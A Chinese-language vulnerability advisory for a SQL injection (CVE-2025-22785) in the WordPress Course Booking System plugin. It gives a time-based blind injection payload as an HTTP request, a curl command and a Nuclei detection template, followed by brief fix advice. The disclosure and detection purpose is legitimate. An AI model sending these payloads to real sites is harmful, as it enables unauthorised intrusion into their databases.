# WordPress Course Booking System SQL 注入漏洞 (CVE-2025-22785)

## 漏洞信息

| 属性 | 值 |
|------|------|
| 漏洞名称 | WordPress Course Booking System SQL 注入 |
| CVE | CVE-2025-22785 |
| 漏洞类型 | SQL 注入 |
| 严重程度 | 高危 |
| 影响组件 | WordPress Course Booking System 插件 |
| 披露时间 | 2026-04-08 |

## 漏洞概述

WordPress Course Booking System 插件存在 SQL 注入漏洞，攻击者可通过构造恶意 SQL 语句获取数据库敏感信息。

## POC

### HTTP POC

```http
POST /wp-admin/admin-ajax.php HTTP/2
Host: target
Content-Type: application/x-www-form-urlencoded

action=cbs_action_booking_delete&booking_id=1&course_id=1 AND (SELECT 4965 FROM (SELECT(SLEEP(4)))GYWH)&date=2024-10-27&user_id=1
```

### Curl POC

```bash
curl -X POST "http://target/wp-admin/admin-ajax.php" \
  -d "action=cbs_action_booking_delete&booking_id=1&course_id=1 AND (SELECT 4965 FROM (SELECT(SLEEP(4)))GYWH)&date=2024-10-27&user_id=1"
```

### Nuclei POC

```yaml
id: wordpress-course-booking-sql-injection

info:
  name: WordPress Course Booking System SQL Injection
  author: 实战安全研究
  severity: high
  description: CVE-2025-22785 SQL Injection

requests:
  - method: POST
    path:
      - "{{BaseURL}}/wp-admin/admin-ajax.php"
    body: "action=cbs_action_booking_delete&booking_id=1&course_id=1 AND (SELECT 4965 FROM (SELECT(SLEEP(4)))GYWH)&date=2024-10-27&user_id=1"
    headers:
      Content-Type: "application/x-www-form-urlencoded"
    matchers:
      - type: dsl
        dsl:
          - "duration>=4"
```

## 修复建议

1. 升级到最新版本
2. 使用预编译语句过滤用户输入

## 参考

- 原文链接：https://mp.weixin.qq.com/s/DYcNfJk4DxZ4Ae7Y33cGUQ